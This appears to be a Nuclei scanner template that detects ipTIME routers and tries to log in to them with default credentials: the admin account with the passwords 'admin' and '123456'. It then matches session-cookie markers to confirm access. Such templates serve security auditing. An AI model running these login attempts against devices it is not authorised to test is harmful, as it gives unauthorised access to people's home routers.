id: poc-yaml-iptime-weak-password-login
info:
  name: ipTIME Weak Password Login
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password,login

variables:
  password:
    - admin
    - 123456

flow: http(1) && http(2)

http:
  - id: check-iptime-login-page
    method: GET
    path:
      - "{{BaseURL}}/login/login.cgi"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "ipTIME"
        part: body
      - type: word
        words:
          - "/sess-bin/login_session.cgi"
        part: body

  - id: attempt-login
    method: POST
    path:
      - "{{BaseURL}}/sess-bin/login_handler.cgi"
    headers:
      Referer: "{{BaseURL}}/sess-bin/login_session.cgi"
    body: "username=admin&passwd={{password}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "setCookie"
        part: body
      - type: word
        words:
          - "efm_session_id"
        part: body
      - type: word
        words:
          - "login.cgi"
        part: body
